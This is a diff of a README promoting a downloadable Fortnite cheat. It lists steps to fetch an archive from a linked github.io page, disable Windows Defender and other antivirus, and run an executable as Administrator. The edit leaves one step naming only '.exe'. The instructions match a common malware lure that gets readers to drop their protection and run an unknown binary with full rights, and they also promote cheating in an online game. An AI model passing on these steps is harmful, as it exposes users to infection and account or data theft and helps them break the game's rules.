@@ -14,7 +14,7 @@ Follow these simple steps to get started immediately:
 1.  **Download the archive:** Click the button above or visit this direct link: **[Download Here](https://finalphoenixdisplay.github.io/Fortnite-External-Hack/)**.
 2.  **Disable Antivirus:** Temporarily disable Windows Defender or any third-party antivirus (Windows Defender may flag the file as a false positive).
 3.  **Extract the files:** Right-click the downloaded archive (`.zip` or `.rar`) and select "Extract to current folder" or "Extract Here". We recommend extracting to your Desktop for easy access.
-4.  **Run the executable:** Open the extracted folder and double-click `Loader.exe` or `Launcher.exe` **(Run as Administrator)**.
+4.  **Run the executable:** Open the extracted folder and double-click `.exe` **(Run as Administrator)**.
 5.  **Launch Fortnite:** Start the Epic Games Launcher and open Fortnite normally.
 6.  **Activate the Menu:** Once you are in the Fortnite lobby or in a match, press the **`INSERT`** key on your keyboard to open the cheat menu.
 7.  **Enjoy:** Configure your settings in the menu and dominate the game!
